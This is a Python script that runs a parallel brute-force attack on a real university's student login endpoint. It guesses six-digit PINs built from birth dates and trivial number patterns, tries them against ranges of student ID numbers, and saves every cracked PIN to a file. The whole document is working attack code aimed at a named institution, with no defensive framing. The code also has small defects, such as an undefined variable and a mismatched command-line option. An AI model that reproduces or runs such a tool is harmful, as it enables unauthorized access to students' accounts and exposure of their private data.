#!/usr/bin/python3

import multiprocessing
import gc
import time
import requests
import sys


def init():
    global URL
    global OK_TXT

    # URL = "http://sion.stikom-bali.ac.id/load_login.php"
    URL = "http://180.250.7.188/load_login.php"
    OK_TXT = """<script language="JavaScript1.2">document.getElementById('usern').style.backgroundColor='#F3F3F3';document.getElementById('passw').style.backgroundColor='#F3F3F3'</script><div id="divTarget">Success </div><script language="javascript">window.location ='/reg/'</script>"""


def init_color():
    global COLORED
    try:
        from colorama import Style, Back, Fore
        COLORED = Fore
    except:
        print("Please install colorama (pip install colorama) to enable color")
        COLORED = False


def init_dictionary(start_year=97, end_year=99):
    global DICTIONARY

    start_time = time.time()
    DICTIONARY = []
    for yy in range(start_year, end_year+1):
        for mm in range(1, 13):
            for dd in range(1, 32):
                if mm == 2 and dd > 29:
                    continue
                if mm in [2, 4, 6, 9, 11] and dd > 30:
                    continue
                DICTIONARY.append(str(dd).zfill(2)
                                  + str(mm).zfill(2)
                                  + str(yy).zfill(2)[-2:])
                DICTIONARY.append(str(yy).zfill(2)[-2:]
                                  + str(mm).zfill(2)
                                  + str(dd).zfill(2))
    # put extra values here
    DICTIONARY += [
        "000000",
        "111111",
        "222222",
        "333333",
        "444444",
        "555555",
        "666666",
        "777777",
        "888888",
        "999999",
        "123456",
        "654321"
    ]
    DICTIONARY = list(set(DICTIONARY))
    total_time = time.time()-start_time

    print("Dictionary generated {} values in {}s"
          .format(len(DICTIONARY), total_time))


def login(pin, depth=0):
    global URL
    global OK_TXT
    global SHARED
    global NIM

    if not SHARED.found and not SHARED.exception:
        try:
            with requests.Session() as s:
                data = {"usern": nim, "passw": pin}
                r = s.post(URL, data=data)
            if r.text == OK_TXT:
                SHARED.found = True
                return pin
        except:
            if depth < 8:
                depth += 1
                try:
                    return login(pin, depth=depth)
                except:
                    pass
            SHARED.exception = True
    return


def brute(nim, process):
    global DICTIONARY
    global SHARED
    global NIM
    global COLORED

    start_time = time.time()
    sys.stdout.write('Trying for {} '.format(nim))
    sys.stdout.flush()

    NIM = nim
    SHARED = multiprocessing.Manager().Namespace()
    SHARED.found = False
    SHARED.exception = False

    p = multiprocessing.Pool(process)
    result = p.map(login, DICTIONARY)
    result = list(set(result))
    result.remove(None)
    p.close()
    p.join()
    total_time = time.time() - start_time

    if SHARED.exception:
        SHARED.exception = False
        with open('exception.txt', 'a') as logfile:
            logfile.write(str(nim) + ' ')
        sys.stdout.write(COLORED.YELLOW if COLORED else '')
        sys.stdout.write('\rException occured for {} '.format(nim))
    elif len(result) == 1:
        with open('found/{}'.format(nim), 'w') as logfile:
            logfile.write(result[0])
        sys.stdout.write(COLORED.GREEN if COLORED else '')
        sys.stdout.write('\rFound {} {} '.format(nim, result[0]))
    else:
        sys.stdout.write(COLORED.RED if COLORED else '')
        sys.stdout.write('\rFailed {} '.format(nim))
    print("time elapsed {}s".format(total_time))
    sys.stdout.write(COLORED.RESET if COLORED else '')


if __name__ == '__main__':
    import argparse

    parser = argparse.ArgumentParser()
    parser.add_argument("--infile",
                        metavar="PATH",
                        help="txt file containing targets to bruteforce")
    parser.add_argument("--outfile",
                        metavar="PATH",
                        default="temp.txt",
                        help="txt file to write if not all target is tried")
    parser.add_argument("--target",
                        metavar="TARGET",
                        type=int,
                        help="target NIM to bruteforce",
                        nargs="+")
    parser.add_argument("--range",
                        metavar=("START", "END"),
                        type=int,
                        nargs=2,
                        help="range of target NIM to bruteforce, END is included in the range")
    parser.add_argument('-p', '--process',
                        type=int,
                        default=multiprocessing.cpu_count(),
                        help="Specify number of process to use, default value is CPU Count * 4. It's more limiting to RAM than CPU, use with CAUTION!!!")
    args = parser.parse_args()

    target = []
    done = []

    if args.list:
        try:
            with open(args.list, 'r') as filetarget:
                target += filetarget.read().split(' ')
        except:
            print("List file is not reachable")
    if args.target:
        target += args.target
    if args.range:
        target += [n for n in range(args.range[0], args.range[1]+1)]
    if target == []:
        print("Target is not set, please see --help")
        exit(1)

    process = args.process

    init()
    init_color()
    init_dictionary()

    print("Starting bruteforce with {} processes for {} target(s)".format(
        process, len(target)))

    try:
        for nim in target:
            brute(nim=nim, process=process)
            done.append(nim)
            gc.collect()
    except KeyboardInterrupt:
        print('\nStopped')
    except:
        print('\nException occured when trying to bruteforce {}'.format(NIM))
    finally:
        if not len(done) == len(target):
            print('Program terminated prematurely. Writing remaining target to temp.txt')
            with open(args.outfile, 'w') as outfile:
                outfile.write(' '.join([str(t) for t in target if t not in done]))
